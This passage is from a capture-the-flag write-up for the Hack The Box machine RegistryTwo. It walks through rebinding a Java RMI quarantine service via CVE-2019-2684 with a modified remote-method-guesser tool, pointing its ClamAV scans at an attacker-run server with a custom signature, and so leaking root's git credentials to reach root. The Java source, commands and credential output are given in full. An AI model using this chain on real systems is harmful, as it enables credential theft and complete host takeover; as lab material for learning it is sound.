The `QuarantineConfiguration` class, is exactly that what i thought. This just monitor a directory, and will send them to the ClamAV server and check for Anomalies.

```bash
developer@registry:/opt$ clamscan -V
ClamAV 0.103.8/26959/Tue Jul  4 07:29:23 2023
```

**Class FileServiceConstans**

```bash
// Source code is decompiled from a .class file using FernFlower decompiler.
package com.htb.hosting.rmi;

import java.io.File;

public class FileServiceConstants {
   public static final File SITES_DIRECTORY = new File("/sites");

   public FileServiceConstants() {
   }
}
```

This class might be pretty interesting because you can configure the `SITES_DIRECTROY` and if you can change it to anything else that you what could be pretty useful.

So with the information I have gathered so far, I can see an attack path. The idea is that we can start our custom Rouge RMI server and manipulate the quarantine configuration so that the server checks the `/root` folder instead of `/sites` and the interesting part comes. You can build your custom signatures for ClamAV and if the file that is in `/root` on our machine has different signature as the file on the server (which is 100% different) the file on the server will be quarantined. And than most likely we can access that file.

```java
/*
 * Decompiled with CFR 0.144.
 */
package com.htb.hosting.rmi;

import java.io.File;

public class FileServiceConstants {
    public static final File SITES_DIRECTORY = new File("/root");
}
```

So I just changed the `/sites` to `/root` and now we should create a file, it could be anything but its very important that this file exists in `/root` on the server.

##### Modified RMG

But during the worked, i asked a question. How can i use my server instead of the running server ? So i cant portforward the port `9002`via ssh to access it from my machine, but i cant stop the running port `9002` on the server.

```bash
┌──(ar0x㉿kali)-[~/…/HTB/Machines/RegistryTwo/RMIServerTest]
└─$ sshpass -p 'qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9' ssh developer@webhosting.htb -L 9002:127.0.0.1:9002 -N
```

After i just started using `rmg (remote-method-guess)` to enumerate the RMI Server.

```bash
┌──(ar0x㉿kali)-[~/…/Machines/RegistryTwo/remote-method-guesser/target]
└─$ java -jar rmg.jar enum 127.0.0.1 9002
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] RMI registry bound names:
[+]
[+]     - QuarantineService
[+]             --> com.htb.hosting.rmi.quarantine.QuarantineService (unknown class)
[+]                 Endpoint: registry.webhosting.htb:40163  TLS: no  ObjID: [-31e00346:18c2a4aec41:-7ffe, -408739197962975509]
[+]     - FileService
[+]             --> com.htb.hosting.rmi.FileService (unknown class)
[+]                 Endpoint: registry.webhosting.htb:40163  TLS: no  ObjID: [-31e00346:18c2a4aec41:-7fff, -9193675061270937181]
[+]
[+] RMI server codebase enumeration:
[+]
[+]     - The remote server does not expose any codebases.
[+]
[+] RMI server String unmarshalling enumeration:
[+]
[+]     - Server complained that object cannot be casted to java.lang.String.
[+]       --> The type java.lang.String is unmarshalled via readString().
[+]       Configuration Status: Current Default
[+]
[+] RMI server useCodebaseOnly enumeration:
[+]
[+]     - RMI registry uses readString() for unmarshalling java.lang.String.
[+]       This prevents useCodebaseOnly enumeration from remote.
[+]
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+]
[+]     - Caught NotBoundException during unbind call (unbind was accepted).
[+]       Vulnerability Status: Vulnerable
[+]
[+] RMI Security Manager enumeration:
[+]
[+]     - Caught Exception containing 'no security manager' during RMI call.
[+]       --> The server does not use a Security Manager.
[+]       Configuration Status: Current Default
[+]
[+] RMI server JEP290 enumeration:
[+]
[+]     - DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+]       Vulnerability Status: Non Vulnerable
[+]
[+] RMI registry JEP290 bypass enumeration:
[+]
[+]     - RMI registry uses readString() for unmarshalling java.lang.String.
[+]       This prevents JEP 290 bypass enumeration from remote.
[+]
[+] RMI ActivationSystem enumeration:
[+]
[+]     - Caught NoSuchObjectException during activate call (activator not present).
[+]       Configuration Status: Current Default
```

Thats great, this makes everything much easier. It looks like that we can unbind the RMI service and this solve the problem that we had earlier.

```bash
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+]
[+]     - Caught NotBoundException during unbind call (unbind was accepted).
[+]       Vulnerability Status: Vulnerable
```

So since `rmg` can do this for us, I thought I could write a plugin for it to add some custom params we need for our server. Unfortunately the plugin plan failed miserably, but I just added some new classes and new methods to this tool and it now I guess the classes and methods we created for this tool should work!

**Class RegistryClient (RMG source)**

```java
    /**
     * Invokes the rebind method on the RMI endpoint. Basically the same as the bind method that
     * was already described above.
     *
     * @param boundName the bound name that will be rebound on the registry
     * @param payloadObject the remote object that is bind to the registry
     * @param localhostBypass whether to use CVE-2019-268 for the rebind operation
     * @param serverIPAddress server ip address for the RMI server to listen
     * @param clamAVServer clamAV server address
     */

    public static String[] clamAVAddress = new String[2];

    public void rebindObject(String boundName, Object payloadObject, boolean localhostBypass, String rougeServerAddress, String clamAVServer)
    { 
        QuarantineServiceImpl quarantineService = null;
        QuarantineService quarantineServiceStub = null;
        FileServiceImpl fileService = null;
        FileService fileServiceStub = null;
        
        boolean isQuaratineService = false;
        boolean isFileService = false;

        if (boundName.equals("QuarantineService")){
            Logger.printlnBlue("QurantineService bound name detected.");
            try {
                if (clamAVServer == null){
                    System.exit(0);
                    Logger.println("ClamAV server address is empty.");
                }
                clamAVAddress = checkTheServerIP(clamAVServer);
                String[] serverAddress = checkTheServerIP(rougeServerAddress);
                System.setProperty("java.rmi.server.hostname", serverAddress[0]);
                quarantineService = new QuarantineServiceImpl();
                quarantineServiceStub = (QuarantineService)UnicastRemoteObject.exportObject(quarantineService, Integer.parseInt(serverAddress[1]));
                payloadObject = quarantineService;
                isQuaratineService = true;
            }
            catch (Exception e) {
                System.out.println("Error: " + e.getMessage());
            }
        }

        if(boundName.equals("FileService")){
            Logger.printlnBlue("FileService bound name detected.");
            try {
                String[] serverAddress = checkTheServerIP(rougeServerAddress);
                System.setProperty("java.rmi.server.hostname", serverAddress[0]);
                fileService = new FileServiceImpl();
                fileServiceStub = (FileService)UnicastRemoteObject.exportObject(fileService, Integer.parseInt(serverAddress[1]));
                payloadObject = fileService;
                isFileService = true;
            }
            catch (Exception e) {
                System.out.println("Error: " + e.getMessage());
            }
        }

        String className = payloadObject.getClass().getName();

        Logger.printMixedBlue("Rebinding name", boundName, "to ");
        Logger.printlnPlainBlue(className);
        Logger.lineBreak();
        Logger.increaseIndent();

        MethodArguments callArguments = new MethodArguments(2);
        callArguments.add(boundName, String.class);
        callArguments.add(payloadObject, Object.class);

        try {
            registryCall("rebind", callArguments, false, localhostBypass);
            Logger.printlnMixedBlue("Encountered", "no Exception", "during rebind call.");
            Logger.printlnMixedYellow("Rebind operation", "was probably successful.");

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                ExceptionHandler.nonLocalhost(e, "rebind", localhostBypass);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, "rebind");

            } else if( t instanceof java.lang.ClassNotFoundException) {
                Logger.eprintlnMixedYellow("Rebind operation", "was accepted", "by the server.");
                Logger.eprintlnMixedBlue("But the class", "RMIServerImpl_Stub", "was not found.");
                Logger.eprintln("The server probably runs on a JRE with limited module access.");

            } else if( t instanceof java.io.InvalidClassException) {
                ExceptionHandler.invalidClassBind(e, "Rebind", className);

            } else if( t instanceof java.lang.UnsupportedOperationException ) {
                ExceptionHandler.unsupportedOperationException(e, "rebind");

            } else {
                ExceptionHandler.unexpectedException(e, "rebind", "call", false);
            }

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, "rebind", "call", false);
        }

        if (isQuaratineService){
            try {
                UnicastRemoteObject.unexportObject(quarantineServiceStub, true);
            } catch (Exception e) {
                Logger.println("Error: " + e.getMessage());
            }
        }

        if (isFileService){
            try {
                UnicastRemoteObject.unexportObject(fileServiceStub, true);
            } catch (Exception e) {
                Logger.println("Error: " + e.getMessage());
            }
        }
    }
```

Modified code snippets from **QuarantineServiceImpl** and **FileServiceConstants**.

```java
public class FileServiceConstants {
    public static final File SITES_DIRECTORY = new File("/root");
}
```

```java
public class QuarantineServiceImpl
implements QuarantineService {
    private static final Logger logger = Logger.getLogger(QuarantineServiceImpl.class.getSimpleName());
    private static final QuarantineConfiguration DEFAULT_CONFIG = new QuarantineConfiguration(new File("/tmp/quarantine"), FileServiceConstants.SITES_DIRECTORY, RegistryClient.clamAVAddress[0], Integer.parseInt(RegistryClient.clamAVAddress[1]), 1000);

    @Override
    public QuarantineConfiguration getConfiguration() throws RemoteException {
        logger.info("client fetching configuration");
        return DEFAULT_CONFIG;
    }
}
```

There is more code that was written for `rmg`, but that is not important for this walkthrough.

##### Setup rouge ClamAV server

So now should just start the ClamAV server i used `/usr/sbin/clamd -c /etc/clamav/clamd.conf` to start the service with the new configuration. But before make sure that the service is stopped and you have now running ClamAV instances.

```txt
┌──(root㉿kali)-[~]
└─# cat /etc/clamav/clamd.conf | tail -n 2
TCPSocket 3310
TCPAddr 0.0.0.0
```

```
┌──(root㉿kali)-[~]
└─# /usr/sbin/clamd -c /etc/clamav/clamd.conf
ERROR: Sat Dec  2 15:51:04 2023 -> TCP: Cannot bind to [0.0.0.0]:3310: Address already in use
```

```bash
┌──(root㉿kali)-[~]
└─# ss -wuntpl | grep 3310                
tcp   LISTEN 0      15                0.0.0.0:3310       0.0.0.0:*    users:(("clamd",pid=852387,fd=4)) 
```

```bash
┌──(ar0x㉿kali)-[~/…/Machines/RegistryTwo/remote-method-guesser_modified/target]
└─$ java -jar rmg-custom.jar rebind 127.0.0.1 9002 127.0.0.1:6565 QuarantineService --htb-rmiserver 10.10.14.81:6565 --htb-clamav 10.10.14.81:3310
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] QurantineService bound name detected.
[+] Rebinding name QuarantineService to com.htb.hosting.rmi.quarantine.QuarantineServiceImpl
[+]
[+]     Encountered no Exception during rebind call.
[+]     Rebind operation was probably successful.
[+]     Error: object not exported
Dec 02, 2023 11:50:01 AM com.htb.hosting.rmi.quarantine.QuarantineServiceImpl getConfiguration
INFO: client fetching configuration
```

I started the server and added two new parameters `--htb-rmiserver` and `--htb-clamav`. The first one will get the ip and port and it will start the RMI server on the given ip and port. The second is the ip and port of our ClamAV server. Before we test this with the real ClamAV instance, let us start the `nc` listener on it and wait to see if we get anything. After a few seconds I got the following result. We got `zSCAN /root/.docker/buildx/.lock` in response. This is great, because now RMI Server will scan the files in `/root` and so the files will be sent to **our ClamAV server** and we can see which file we want to read.

```bash
┌──(ar0x㉿kali)-[~]
└─$ nc -lvnp 3310
listening on [any] 3310 ...
connect to [10.10.14.81] from (UNKNOWN) [10.129.229.28] 40344
zSCAN /root/.docker/buildx/.lock 
```

Activated the ClamAV server again, and started wireshark to capture the filenames. Lets check the result.

```bash
● clamav-daemon.service - Clam AntiVirus userspace daemon
     Loaded: loaded (/lib/systemd/system/clamav-daemon.service; disabled; preset: disabled)
    Drop-In: /etc/systemd/system/clamav-daemon.service.d
             └─extend.conf
     Active: active (running) since Sat 2023-12-02 12:02:29 CET; 3min 33s ago
TriggeredBy: ● clamav-daemon.socket
       Docs: man:clamd(8)
             man:clamd.conf(5)
             https://docs.clamav.net/
    Process: 752150 ExecStartPre=/bin/mkdir -p /run/clamav (code=exited, status=0/SUCCESS)
    Process: 752154 ExecStartPre=/bin/chown root /run/clamav (code=exited, status=0/SUCCESS)
   Main PID: 752157 (clamd)
      Tasks: 2 (limit: 37496)
     Memory: 1.4G
        CPU: 12.049s
     CGroup: /system.slice/clamav-daemon.service
             └─752157 /usr/sbin/clamd --foreground=true
```

![](https://media.discordapp.net/attachments/1071118357933338645/1180522407480532992/image.png?ex=657dba2a&is=656b452a&hm=cbc5debb7afb3ecb28000cf01c06ce3603df168778690e54a630d0dc4ebac5ea&=&format=webp&quality=lossless&width=985&height=89)

Thats great, user root has also `.git-credentals` so we can try to read this file. We also can just read root flag but neehhh, want a shell on this fucker.

![](https://media.discordapp.net/attachments/1071118357933338645/1180522550317563914/image.png?ex=657dba4d&is=656b454d&hm=05d24cd8040051a06ab6f90fb2db50fe72f229661b2d7b00cd091d2815918754&=&format=webp&quality=lossless&width=985&height=98)

###### Creating custom signature for .git-credentials

This article is great and creates custom signatures with ClamAV like https://blog.adamsweet.org/?p=250, I took that as a resource for the signature part. First we should start the ClamAV server on port 3310 and change the 127.0.0.1 address in `/etc/clamav/conf.d` to 0.0.0.0 so that everyone can access this port.

We use `sigtool` to calculate the signature of the new file from the first 2048 bytes.

```bash
┌──(root㉿kali)-[~]
└─# echo 'ssuuii' > .git-credentials                          
┌──(root㉿kali)-[~]
└─# cat .git-credentials | sigtool --hex-dump | head -c 2048
7373757569690a
```

Now that we have the signature, we should create our `ndb` file. The `ndb` file contains signatures, which are unique patterns of known (in our case unknown) malware. These signatures allow ClamAV to identify and block files or processes that match the patterns associated with malicious software.

We should edit `customsig.ndb` and prefix the contents with the appropriate name, type and offset in the following format

```txt
Name:Type:Offset:HexOutput
```

So I just took the name from the blog, but the name is completely irrelevant, you can call it `amogus` or `kek`whatever, the next part I took `0`because ClamAV has a table that indicates the MalwareType. And `0` stands for `any file`. We do not need to scan a specific offset, so we choose `*` to scan the whole file and at the end, the signature we created earlier.

```bash
┌──(root㉿kali)-[/var/lib/clamav]
└─# cat customsig.ndb
Trojan.Win32.Emold.A:0:*:7373757569690a
```

```
Type is one of the following:
- 0 = any file
- 1 = Portable Executable (ie Windows exe)
- 2 = OLE2 component (e.g. a VBA script)
- 3 = HTML (normalised)
- 4 = Mail file
- 5 = Graphics
- 6 = ELF
- 7 = ASCII text file (normalised)
```

Fingers crossed, we try again and see if we can get the .git credentials in the quarantine folder in `/tmp'.

```bash
developer@registry:/tmp$ ls quarantine/
quarantine-run-2023-12-02T15:22:03.416973652
```

Kaboooommmm, yeah fucker. Finally got it, now check the `.git-credentials` file.

```bash
developer@registry:/tmp$ cat quarantine/quarantine-run-2023-12-02T15\:22\:03.416973652/_root_.git-credentials 
https://admin:52nWqz3tejiImlbsihtV@github.com
```

```
admin:52nWqz3tejiImlbsihtV 
```

Great, here we have the root password. Lets change the user and we should probably get root access!

```bash
developer@registry:/tmp$ su
Password: 
root@registry:/tmp# cat /root/root.txt 
44eb63dcdf0a75bbdb043df157cac81c
```

Finally we finished this box, and this box was really fun and **PAIN**. But I learned a lot, so its ok.

---
#### Lessons learned
- Java Programming
- Java RMI concept
- Dumping docker registry
- Using docker registry API
- Tomcat Path Traversal
- [RMG](https://github.com/qtc-de/remote-method-guesser)
- Exploiting RMI Server with - [ysoserial](https://github.com/frohoff/ysoserial)
---

Machine tags:

- #HTB/Insane/RegistryTwo 
- #Linux 
- #Java/RMI
- #Java/Deserialization
- #Apache/Tomcat
- #Docker/DockerHubAPI
- #Docker/DockerRegistryDump
- #ClamAV/CustomSignature

---
